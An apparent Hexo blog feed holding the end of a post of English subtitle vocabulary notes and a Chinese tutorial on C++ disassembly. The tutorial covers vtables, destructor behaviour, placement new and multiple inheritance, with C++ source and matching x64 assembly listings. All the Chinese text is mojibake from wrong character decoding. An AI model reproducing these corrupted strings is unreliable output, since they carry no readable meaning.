tv</p><p>ä½ æƒ³æ•£æ­¥è¿˜æ˜¯ååœ¨æ²™å‘ä¸Šçœ‹ç”µè§†</p><p>and iâ€™m like ,i canâ€™t figure that out .I donâ€™t have the brain power</p><p>æˆ‘å°±æ²¡åŠæ³•é€‰æ‹©ï¼Œæˆ‘æ²¡é‚£ä¸ªè„‘åŠ›</p><ul><li><p>absolute å®Œå…¨çš„ï¼Œç»å¯¹çš„</p></li><li><p>inability to do sth æ²¡èƒ½åŠ›å»åšä»€ä¹ˆäº‹</p><p>our inability to understand how theyâ€™re doing</p><p>æˆ‘ä»¬æ— æ³•ç†è§£ä»–ä»¬æ˜¯æ€ä¹ˆåšåˆ°çš„</p></li><li><p>paralyz ä½¿ç˜«ç—ª</p><p>theyâ€™re getting paralyz from the waist down</p><p>ä»–ä»¬è…°éƒ¨ä»¥ä¸‹éƒ½ç˜«ç—ªäº†</p></li><li><p>odd å¥‡æ€ªçš„ï¼Œåå¸¸çš„ï¼Œå¶å°”çš„</p></li></ul><h2 id="8-29"><a href="#8-29" class="headerlink" title="8.29"></a>8.29</h2><p><a href="https://www.bilibili.com/video/BV1bD4y1N78S/">https://www.bilibili.com/video/BV1bD4y1N78S/</a></p><p>Does he have to spend the rest of his life with someone he doesnâ€™t love to spare her feelings</p><p>éš¾é“ä»–ä¼šä¸ºäº†ä¸ä¼¤å®³å¥¹çš„æ„Ÿæƒ…è€Œå’Œä¸çˆ±çš„äººå…±åº¦ä½™ç”Ÿå—</p><p>Itâ€™s love ,Itâ€™s not a game played fair ,there are no rules</p><p>è¿™æ˜¯çˆ±æƒ…ï¼Œè¿™ä¸æ˜¯ä¸€ä¸ªå…¬å¹³çš„æ¸¸æˆï¼Œæ²¡æœ‰è§„åˆ™</p><p>Now maybe she hasnâ€™t committed a crime yet.but i know jackie ,She will. She always settled her scores</p><p>ç°åœ¨å¯èƒ½ä»–è¿˜æ²¡æœ‰çŠ¯ç½ªï¼Œä½†æˆ‘äº†è§£jackieï¼Œä»–ä¼šçš„ï¼Œä»–æ€»æ˜¯æŠ¥ä»‡é›ªæ¨ </p><ul><li><p>spare someoneâ€™s feelings é¿å…è®©æŸäººéš¾è¿‡</p><p>lying to someone in order to spare their feelings</p></li></ul><p>â€‹å¯¹æŸäººæ’’è°ä½¿ä¸ºäº†é¿å…ä»–ä»¬éš¾è¿‡</p><ul><li>committe a crime çŠ¯ç½ª</li><li>settle the scores  ç®—æ—§è´¦</li></ul><h2 id="8-30"><a href="#8-30" class="headerlink" title="8.30"></a>8.30</h2><p><a href="https://www.bilibili.com/video/BV1s54y1N7KQ">https://www.bilibili.com/video/BV1s54y1N7KQ</a></p><p>My motherâ€˜s bipolar and my fatherâ€™s an alcoholic and an addict</p><p>æˆ‘å¦ˆå¦ˆæ‚£æœ‰èºéƒç—‡ï¼Œè€Œæˆ‘çˆ¶äº²æ˜¯ä¸ªé…’é¬¼å’Œç˜¾å›å­</p><p>He takes what he pleases and he offers nothing .No money.No support</p><p>ä»–åªä¼šäº«å—å´ä»ä¸ä»˜å‡ºï¼Œä¸ç»™é’±ä¹Ÿä¸å‡ºåŠ›</p><p>iâ€™ve done what i could to help raise my siblings ,i wish i couldâ€™ve done more</p><p>æˆ‘å·²ç»å°½æˆ‘æ‰€èƒ½æŠšå…»æˆ‘çš„å¼Ÿå¦¹ä»¬ï¼Œæˆ‘å¸Œæœ›æˆ‘èƒ½åšçš„æ›´å¤šäº›</p><ul><li>bipolar æœ‰ä¸¤çº§çš„ï¼Œæ‚£æœ‰èºéƒç—‡çš„</li><li>alcoholic é…’ç²¾çš„ï¼Œn.é…’é¬¼</li><li>addict n. ç˜¾å›å­</li><li>siblings å…„å¼Ÿå§å¦¹</li></ul><h2 id="8-31"><a href="#8-31" class="headerlink" title="8.31"></a>8.31</h2><p><a href="https://www.bilibili.com/video/BV138411u72d/">https://www.bilibili.com/video/BV138411u72d/</a></p><p>the teenage years are limbo,youâ€™re somewhere between being a kid and and adult</p><p>é’å°‘å¹´æ—¶æœŸæ˜¯ä¸çŸ¥å¦‚ä½•æ˜¯å¥½çš„å°´å°¬é˜¶æ®µï¼Œä½ æ—¢ä¸æ˜¯å­©å­ä¹Ÿä¸æ˜¯å¤§äºº</p><p>and the world tells you to be mature and express yourselfï¼Œbut the minute that you do it,it tells you to shut up</p><p>ç„¶è€Œå…¨ä¸–ç•Œå‘Šè¯‰ä½ è¦å˜å¾—æˆç†Ÿï¼Œè¦è¡¨è¾¾è‡ªå·±ï¼Œä½†æ˜¯å½“ä½ åˆšä¸€è¿™ä¹ˆåšï¼Œå…¨ä¸–ç•Œåˆå«ä½ è¦é—­å˜´</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>C++åæ±‡ç¼– 0x01</title>
      <link href="/2023/10/26/Cpp-disassemble-1/"/>
      <url>/2023/10/26/Cpp-disassemble-1/</url>
      
        <content type="html"><![CDATA[<h2 id="è™šå‡½æ•°"><a href="#è™šå‡½æ•°" class="headerlink" title="è™šå‡½æ•°"></a>è™šå‡½æ•°</h2><p>ç¼–è¯‘å™¨ä¼šå°†è¯¥ç±»ä¸­æ‰€æœ‰è™šå‡½æ•°çš„é¦–åœ°å€ä¿å­˜åœ¨ä¸€å¼ åœ°å€è¡¨ä¸­ï¼Œè¿™å¼ è¡¨è¢«ç§°ä¸ºè™šå‡½æ•°åœ°å€è¡¨ï¼Œç®€ç§°è™šè¡¨ã€‚ç¼–è¯‘å™¨è¿˜ä¼šåœ¨ç±»çš„é¦–éƒ¨æ·»åŠ ä¸€ä¸ªéšè—æ•°æ®æˆå‘˜ï¼Œç§°ä¸ºè™šè¡¨æŒ‡é’ˆã€‚ä¿å­˜ç€è™šè¡¨çš„é¦–åœ°å€</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  <span class="comment">//è™šå‡½æ•°å®šä¹‰</span></span><br><span class="line">    <span class="keyword">return</span> age;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;  <span class="comment">//è™šå‡½æ•°å®šä¹‰</span></span><br><span class="line">    this-&gt;age = age;</span><br><span class="line">  &#125;</span><br><span class="line">  ~Person() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;~Person()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">private:</span><br><span class="line">  <span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person person;</span><br><span class="line">  person.setAge(<span class="number">20</span>);</span><br><span class="line">  Person* ptr=&amp;person;</span><br><span class="line">  ptr-&gt;setAge(<span class="number">22</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, person.getAge());</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000001400016E0    ; __unwind &#123; // __CxxFrameHandler4_0</span><br><span class="line">.text:00000001400016E0    mov     [rsp+arg_8], rdx</span><br><span class="line">.text:00000001400016E5    mov     [rsp+arg_0], ecx</span><br><span class="line">.text:00000001400016E9    sub     rsp, 48h</span><br><span class="line">.text:00000001400016ED    lea     rcx, [rsp+48h+var_18]           ; this</span><br><span class="line">.text:00000001400016F2    call    j_??0Person@@QEAA@XZ            ; Person::Person(void)</span><br><span class="line">.text:00000001400016F2</span><br><span class="line">.text:00000001400016F7    nop</span><br><span class="line">.text:00000001400016F8    mov     edx, 14h                        ; age</span><br><span class="line">.text:00000001400016FD    lea     rcx, [rsp+48h+var_18]           ; this</span><br><span class="line">.text:0000000140001702    call    j_?setAge@Person@@UEAAXH@Z      ; Person::setAge(int)</span><br><span class="line">.text:0000000140001702</span><br><span class="line">.text:0000000140001707    lea     rax, [rsp+48h+var_18]</span><br><span class="line">.text:000000014000170C    mov     [rsp+48h+var_20], rax</span><br><span class="line">.text:0000000140001711    mov     rax, [rsp+48h+var_20]           ;raxä¸ºthis</span><br><span class="line">.text:0000000140001716    mov     rax, [rax]                      ;raxä¸ºè™šè¡¨æŒ‡é’ˆ</span><br><span class="line">.text:0000000140001719    mov     edx, 16h                        ;å‚æ•°:setAge(22)</span><br><span class="line">.text:000000014000171E    mov     rcx, [rsp+48h+var_20]           ;thisæŒ‡é’ˆç”¨æ¥å¯»å€ageæˆå‘˜</span><br><span class="line">.text:0000000140001723    call    qword ptr [rax+8]               ;åˆ©ç”¨è™šè¡¨è°ƒç”¨setAge</span><br><span class="line">.text:0000000140001723</span><br><span class="line">.text:0000000140001726    lea     rcx, [rsp+48h+var_18]           ; this</span><br><span class="line">.text:000000014000172B    call    j_?getAge@Person@@UEAAHXZ       ; Person::getAge(void)</span><br><span class="line">.text:000000014000172B</span><br><span class="line">.text:0000000140001730    mov     edx, eax</span><br><span class="line">.text:0000000140001732    lea     rcx, aD                         ; &quot;%d\n&quot;</span><br><span class="line">.text:0000000140001739    call    j_printf</span><br><span class="line">.text:0000000140001739</span><br><span class="line">.text:000000014000173E    mov     [rsp+48h+var_28], 0</span><br><span class="line">.text:0000000140001746    lea     rcx, [rsp+48h+var_18]           ; this</span><br><span class="line">.text:000000014000174B    call    j_??1Person@@QEAA@XZ            ; Person::~Person(void)</span><br><span class="line">.text:000000014000174B</span><br><span class="line">.text:0000000140001750    mov     eax, [rsp+48h+var_28]</span><br><span class="line">.text:0000000140001754    add     rsp, 48h</span><br><span class="line">.text:0000000140001758    retn</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å™¨è‡ªåŠ¨æ·»åŠ æ„é€ å‡½æ•°,æŠŠç±»é¦–éƒ¨èµ‹å€¼ä¸ºè™šè¡¨æŒ‡é’ˆ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.rdata:<span class="number">0000000140007</span>DE8 ??_7Person@@<span class="number">6B</span>@ dq offset j_?getAge@Person@@UEAAHXZ, offset j_?setAge@Person@@UEAAXH@Z, <span class="number">0</span></span><br><span class="line"></span><br><span class="line">.text:<span class="number">0000000140001510</span>  ; <span class="type">void</span> __fastcall <span class="title function_">Person::Person</span><span class="params">(Person *this)</span></span><br><span class="line">.text:0000000140001510  ??0Person@@QEAA@XZ proc near            ; CODE XREF: Person::Person(<span class="type">void</span>)â†‘j</span><br><span class="line">.text:<span class="number">0000000140001510</span></span><br><span class="line">.text:<span class="number">0000000140001510</span>  arg_0= qword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">0000000140001510</span></span><br><span class="line">.text:<span class="number">0000000140001510</span>  mov     [rsp+arg_0], rcx</span><br><span class="line">.text:<span class="number">0000000140001515</span>  mov     rax, [rsp+arg_0]</span><br><span class="line">.text:<span class="number">000000014000151</span>A  lea     rcx, ??_7Person@@<span class="number">6B</span>@            ; <span class="type">const</span> Person::`vftable<span class="number">&#x27;</span></span><br><span class="line">.text:<span class="number">0000000140001521</span>  mov     [rax], rcx</span><br><span class="line">.text:<span class="number">0000000140001524</span>  mov     rax, [rsp+arg_0]</span><br><span class="line">.text:<span class="number">0000000140001529</span>  retn</span><br></pre></td></tr></table></figure><p>ææ„å‡½æ•°ä¼šå†æ¬¡ç»™ç±»é¦–éƒ¨èµ‹å€¼è™šè¡¨æŒ‡é’ˆï¼Œè®©å…¶æŒ‡å‘è‡ªèº«çš„è™šè¡¨é¦–åœ°å€ï¼Œ</p><p>å­ç±»ä»¥åå¯èƒ½ä¼šè¢«å…¶ä»–ç±»ç»§æ‰¿æˆä¸ºçˆ¶ç±»,å­ç±»æ‰§è¡Œå®Œææ„å‡½æ•°æ‰§è¡Œçˆ¶ç±»çš„ææ„ï¼Œæ­¤æ—¶thisæŒ‡é’ˆå¤„è™šè¡¨æ˜¯å­ç±»çš„ï¼Œå¦‚æœä¸ä¿®æ”¹è™šè¡¨å°±ä¼šæ‰§è¡Œåˆ°å­ç±»ææ„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000140001570   ; void __fastcall Person::~Person(Person *this)</span><br><span class="line">.text:0000000140001570   ??1Person@@QEAA@XZ proc near            ; CODE XREF: Person::~Person(void)â†‘j</span><br><span class="line">.text:0000000140001570                                           ; DATA XREF: .pdata:ExceptionDirâ†“o</span><br><span class="line">.text:0000000140001570</span><br><span class="line">.text:0000000140001570   arg_0= qword ptr  8</span><br><span class="line">.text:0000000140001570</span><br><span class="line">.text:0000000140001570   mov     [rsp+arg_0], rcx</span><br><span class="line">.text:0000000140001575   sub     rsp, 28h</span><br><span class="line">.text:0000000140001579   mov     rax, [rsp+28h+arg_0]</span><br><span class="line">.text:000000014000157E   lea     rcx, ??_7Person@@6B@            ; const Person::`vftable&#x27;</span><br><span class="line">.text:0000000140001585   mov     [rax], rcx</span><br><span class="line">.text:0000000140001588   lea     rcx, _Format                    ; &quot;~Person()\n&quot;</span><br><span class="line">.text:000000014000158F   call    j_printf</span><br><span class="line">.text:000000014000158F</span><br><span class="line">.text:0000000140001594   add     rsp, 28h</span><br><span class="line">.text:0000000140001598   retn</span><br></pre></td></tr></table></figure><p>åŒæ—¶å¯ä»¥å‘ç°ç›´æ¥ä½¿ç”¨å¯¹è±¡è°ƒç”¨è‡ªèº«è™šå‡½æ•°æ—¶ï¼Œè¢«ç¼–è¯‘æˆç›´æ¥callè™šå‡½æ•°ï¼Œä¸èµ°è™šè¡¨ï¼Œæ•ˆç‡é«˜</p><p>é€šè¿‡æŒ‡é’ˆæˆ–è€…å¼•ç”¨(å¼•ç”¨åªæ˜¯åœ¨ç¼–è¯‘æœŸé—´å¤šäº†æ£€æµ‹çš„æŒ‡é’ˆ)è°ƒç”¨è™šå‡½æ•°æ˜¯ä»è™šè¡¨å–å‡ºè™šå‡½æ•°æŒ‡é’ˆå†è°ƒç”¨</p><h2 id="ç±»ä¸çˆ¶ç±»ä¹‹é—´å…³ç³»"><a href="#ç±»ä¸çˆ¶ç±»ä¹‹é—´å…³ç³»" class="headerlink" title="ç±»ä¸çˆ¶ç±»ä¹‹é—´å…³ç³»"></a>ç±»ä¸çˆ¶ç±»ä¹‹é—´å…³ç³»</h2><p>åœ¨å†…å­˜ä¸­çš„æ•°æ®æ’åˆ—ï¼šå…ˆå®‰æ’çˆ¶ç±»çš„æ•°æ®ï¼Œåå®‰æ’å­ç±»æ–°å®šä¹‰çš„æ•°æ®ã€‚çˆ¶ç±»ä¸­å£°æ˜ä¸ºç§æœ‰ï¼ˆprivateï¼‰çš„æˆå‘˜ï¼Œå­ç±»å¯¹è±¡æ— æ³•ç›´æ¥è®¿é—®ï¼Œä½†æ˜¯åœ¨å­ç±»å¯¹è±¡çš„å†…å­˜ç»“æ„ä¸­ï¼Œçˆ¶ç±»ç§æœ‰çš„æˆå‘˜æ•°æ®ä¾ç„¶å­˜åœ¨ã€‚C++è¯­æ³•è§„å®šçš„è®¿é—®æ§åˆ¶ä»…é™äºç¼–è¯‘å±‚é¢ï¼Œåœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ç”±ç¼–è¯‘å™¨è¿›è¡Œè¯­æ³•æ£€æŸ¥</p><blockquote><p>çˆ¶ç±»æ•°æ®åœ¨å‰é¢æ–¹ä¾¿äº†ä½¿ç”¨çˆ¶ç±»å‡½æ•°ï¼Œç›´æ¥ä¼ é€’å­ç±»thisæŒ‡é’ˆå³å¯</p></blockquote><p>å¯¹äºå­ç±»æ— æ„é€ ææ„å‡½æ•°ï¼Œçˆ¶ç±»æœ‰æ„é€ å’Œææ„å‡½æ•°ï¼Œå­ç±»ä¼šæä¾›é»˜è®¤æ„é€ å’Œææ„å‡½æ•°</p><p>æ„é€ ï¼šåŸºç±»â†’åŸºç±»çš„æ´¾ç”Ÿç±»â†’â€¦â€¦â†’å½“å‰ç±»ã€‚<br>ææ„ï¼šå½“å‰ç±»â†’åŸºç±»çš„æ´¾ç”Ÿç±»â†’â€¦â€¦â†’åŸºç±»ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span>    <span class="comment">// åŸºç±»â€”&quot; äºº &quot; ç±»</span></span><br><span class="line">public:</span><br><span class="line">  Person() &#123;</span><br><span class="line">    showSpeak();</span><br><span class="line">  &#125;</span><br><span class="line">  virtual ~Person() &#123;</span><br><span class="line">    showSpeak();</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Speak Person\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chinese</span> :</span> public Person &#123;    <span class="comment">// ä¸­å›½äººï¼šç»§æ‰¿è‡ªäººç±»</span></span><br><span class="line">public:</span><br><span class="line">  Chinese() &#123;&#125;</span><br><span class="line">  virtual ~Chinese() &#123;&#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123;    <span class="comment">// è¦†ç›–åŸºç±»è™šå‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Speak Chinese\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">American</span> :</span> public Person &#123; <span class="comment">//ç¾å›½äººï¼šç»§æ‰¿è‡ªäººç±»</span></span><br><span class="line">public:</span><br><span class="line">  American() &#123;&#125;</span><br><span class="line">  virtual ~American() &#123;&#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123; <span class="comment">//è¦†ç›–åŸºç±»è™šå‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Speak American\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">German</span> :</span> public Person &#123; <span class="comment">//å¾·å›½äººï¼šç»§æ‰¿è‡ªäººç±»</span></span><br><span class="line">public:</span><br><span class="line">  German() &#123;&#125;</span><br><span class="line">  virtual ~German() &#123;&#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123; <span class="comment">//è¦†ç›–åŸºç±»è™šå‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Speak German\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">speak</span><span class="params">(Person* person)</span> &#123; <span class="comment">//æ ¹æ®è™šè¡¨ä¿¡æ¯è·å–è™šå‡½æ•°é¦–åœ°å€å¹¶è°ƒç”¨</span></span><br><span class="line">  person-&gt;showSpeak();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Chinese chinese;</span><br><span class="line">  American american;</span><br><span class="line">  German german;</span><br><span class="line">  speak(&amp;chinese);</span><br><span class="line">  speak(&amp;american);</span><br><span class="line">  speak(&amp;german);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å­ç±»ä¼šæŒ‰ç…§çˆ¶ç±»è™šå‡½æ•°å®šä¹‰çš„é¡ºåºæ’åˆ—å±äºè‡ªå·±çš„è™šè¡¨</p><p><img src="/2023/10/26/Cpp-disassemble-1/image-20231026094850173.png" alt="image-20231026094850173"></p><p>è°ƒç”¨æ„é€ æˆ–ææ„å‡½æ•°ç¬¬ä¸€æ­¥éƒ½æ˜¯å°†è™šè¡¨æŒ‡é’ˆæ¢ä¸ºè¯¥ç±»çš„è™šè¡¨æŒ‡é’ˆï¼Œæ¥è°ƒç”¨åˆ°å±äºè‡ªå·±çš„å‡½æ•°</p><blockquote><p>ææ„å‡½æ•°æ²¡æœ‰è¢«å®šä¹‰ä¸ºè™šå‡½æ•°ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨ä¼šæŒ‰æŒ‡é’ˆçš„ç±»å‹è°ƒç”¨çˆ¶ç±»çš„ææ„å‡½æ•°ï¼Œä»è€Œå¼•å‘é”™è¯¯</p></blockquote><p>æ˜¾å¼è°ƒç”¨ææ„å‡½æ•°æ—¶ä¸èƒ½é©¬ä¸Šé‡Šæ”¾å †å†…å­˜ï¼Œæ‰€ä»¥åœ¨ææ„å‡½æ•°çš„ä»£ç†å‡½æ•°ä¸­é€šè¿‡ä¸€ä¸ªå‚æ•°æ§åˆ¶æ˜¯å¦é‡Šæ”¾å†…å­˜ï¼Œä¾¿äºç¨‹åºå‘˜ç®¡ç†ææ„å‡½æ•°çš„è°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;new.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span>    <span class="comment">// åŸºç±»â€”&quot; äºº &quot; ç±»</span></span><br><span class="line">public:</span><br><span class="line">  Person() &#123;&#125;</span><br><span class="line">  virtual ~Person() &#123;&#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Chinese</span> :</span> public Person &#123;    <span class="comment">// ä¸­å›½äººï¼šç»§æ‰¿è‡ªäººç±»</span></span><br><span class="line">public:</span><br><span class="line">  Chinese() &#123;&#125;</span><br><span class="line">  virtual ~Chinese() &#123;&#125;</span><br><span class="line">  virtual <span class="type">void</span> <span class="title function_">showSpeak</span><span class="params">()</span> &#123;    <span class="comment">// è¦†ç›–åŸºç±»è™šå‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Speak Chinese\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line">  Person* p = new Chinese;</span><br><span class="line">  p-&gt;~Person(); <span class="comment">//æ˜¾å¼è°ƒç”¨ææ„å‡½æ•°</span></span><br><span class="line">  <span class="comment">//å°†å †å†…å­˜ä¸­pæŒ‡å‘çš„åœ°å€ä½œä¸ºChineseçš„æ–°å¯¹è±¡çš„é¦–åœ°å€ï¼Œå¹¶è°ƒç”¨Chineseçš„æ„é€ å‡½æ•°ã€‚è¿™</span></span><br><span class="line">  <span class="comment">//æ ·å¯ä»¥é‡å¤ä½¿ç”¨åŒä¸€ä¸ªå †å†…å­˜ï¼Œä»¥èŠ‚çº¦å†…å­˜ç©ºé—´</span></span><br><span class="line">  p = new (p) Chinese();</span><br><span class="line">  delete p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22:   p-&gt;~Person(); //æ˜¾å¼è°ƒç”¨ææ„å‡½æ•°</span><br><span class="line">0000000140001772  mov         rax,qword ptr [p] ;rax=å¯¹è±¡åœ°å€</span><br><span class="line">0000000140001777  mov         rax,qword ptr [rax]  ;rax=è™šè¡¨æŒ‡é’ˆ</span><br><span class="line">000000014000177A  xor         edx,edx  ;å‚æ•°0åªè°ƒç”¨ææ„å‡½æ•°ä¸é‡Šæ”¾</span><br><span class="line">000000014000177C  mov         rcx,qword ptr [p] ;thisæŒ‡é’ˆ</span><br><span class="line">0000000140001781  call        qword ptr [rax]  ;è™šè¡¨ç¬¬ä¸€é¡¹:ä»£ç†ææ„å‡½æ•°</span><br><span class="line">    23:   //å°†å †å†…å­˜ä¸­pæŒ‡å‘çš„åœ°å€ä½œä¸ºChineseçš„æ–°å¯¹è±¡çš„é¦–åœ°å€ï¼Œå¹¶è°ƒç”¨Chineseçš„æ„é€ å‡½æ•°ã€‚è¿™</span><br><span class="line">    24:   //æ ·å¯ä»¥é‡å¤ä½¿ç”¨åŒä¸€ä¸ªå †å†…å­˜ï¼Œä»¥èŠ‚çº¦å†…å­˜ç©ºé—´</span><br><span class="line">    25:   p = new (p) Chinese();</span><br><span class="line">0000000140001783  mov         rdx,qword ptr [p]  </span><br><span class="line">0000000140001788  mov         ecx,8  </span><br><span class="line">000000014000178D  call        operator new (0140001203h)  </span><br><span class="line">0000000140001792  mov         qword ptr [rsp+48h],rax  </span><br><span class="line">0000000140001797  mov         rcx,qword ptr [rsp+48h];thisæŒ‡é’ˆ  </span><br><span class="line">000000014000179C  call        Chinese::Chinese (01400011CCh)  </span><br><span class="line">00000001400017A1  mov         qword ptr [p],rax </span><br></pre></td></tr></table></figure><p><code>000000014000178D  call        operator new (0140001203h)</code>  è¿™é‡Œnewä¹Ÿä¸æ˜¯å®Œæ•´çš„new</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">   167:         _Writable_bytes_(_Size) void* _Where) noexcept</span><br><span class="line">   168:     &#123;</span><br><span class="line">00000001400015C0 48 89 54 24 10       mov         qword ptr [rsp+10h],rdx  </span><br><span class="line">00000001400015C5 48 89 4C 24 08       mov         qword ptr [rsp+8],rcx  </span><br><span class="line">   169:         (void)_Size;</span><br><span class="line">   170:         return _Where;</span><br><span class="line">00000001400015CA 48 8B 44 24 10       mov         rax,qword ptr [rsp+10h]  </span><br><span class="line">   171:     &#125;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æŠŠå †è¿”å›å›æ¥äº†</p><h2 id="å¤šé‡ç»§æ‰¿"><a href="#å¤šé‡ç»§æ‰¿" class="headerlink" title="å¤šé‡ç»§æ‰¿"></a>å¤šé‡ç»§æ‰¿</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sofa</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Sofa() &#123;</span><br><span class="line">    color = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual ~Sofa() &#123;    <span class="comment">// æ²™å‘ç±»è™šææ„å‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual ~Sofa()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getColor</span><span class="params">()</span> &#123;    <span class="comment">// è·å–æ²™å‘é¢œè‰²</span></span><br><span class="line">    <span class="keyword">return</span> color;</span><br><span class="line">  &#125;</span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sitDown</span><span class="params">()</span> &#123;    <span class="comment">// æ²™å‘å¯ä»¥åä¸‹ä¼‘æ¯</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Sit down and rest your legs\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> color;    <span class="comment">// æ²™å‘ç±»æˆå‘˜å˜é‡</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å®šä¹‰åºŠç±»</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bed</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">  Bed() &#123;</span><br><span class="line">    length = <span class="number">4</span>;</span><br><span class="line">    width = <span class="number">5</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual ~Bed() &#123;  <span class="comment">//åºŠç±»è™šææ„å‡½æ•°</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;virtual ~Bed()\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">getArea</span><span class="params">()</span> &#123; <span class="comment">//è·å–åºŠé¢ç§¯</span></span><br><span class="line">    <span class="keyword">return</span> length * width;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  virtual <span class="type">int</span> <span class="title function_">sleep</span><span class="params">()</span> &#123;  <span class="comment">//åºŠå¯ä»¥ç”¨æ¥ç¡è§‰</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;go to sleep\r\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">protected:</span><br><span class="line">  <span class="type">int</span> length;    <span class="comment">//åºŠç±»æˆå‘˜å˜é‡</span></span><br><span 